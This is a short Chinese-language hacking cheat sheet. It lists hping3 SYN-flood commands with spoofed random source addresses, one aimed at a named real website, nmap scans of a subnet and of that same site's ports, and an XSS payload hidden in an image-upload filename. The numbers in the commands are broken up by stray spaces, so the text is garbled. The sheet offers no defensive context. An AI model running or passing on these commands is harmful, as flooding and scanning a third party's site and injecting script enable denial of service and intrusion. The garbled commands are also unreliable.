## Hacker
  
### hping 3 洪水攻击  
  
```  
sudo hping 3 --flood -S --rand-source -p 8 0 1 2 1.4 2.1 5 5.6 9  
sudo hping 3 -c 1 0 0 0 0 0 -d 1 2 0 -S -w 6 4 -p 8 0 --flood --rand-source www.integle.com  
```  
  
### 扫描指定网段存活的主机  
  
```  
sudo nmap -sP -Pl -PT 1 9 2.1 6 8.1.0/2 4  
```  
  
### 端口服务扫描  
  
```  
sudo nmap www.integle.com -p 0-6 5 5 3 5  
```  
  
### XSS 图片上传  

```  
"><img src=x onerror=alert(location.href)>.jpg  
```  
